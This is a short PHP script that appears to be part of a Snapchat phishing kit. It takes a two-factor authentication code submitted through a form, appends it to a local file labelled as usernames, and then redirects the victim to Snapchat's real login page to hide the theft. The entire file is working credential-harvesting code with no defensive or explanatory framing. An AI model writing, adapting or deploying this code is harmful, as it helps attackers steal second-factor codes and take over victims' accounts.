<?php

file_put_contents("usernames.txt", "Snapchat 2FA code: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
?>
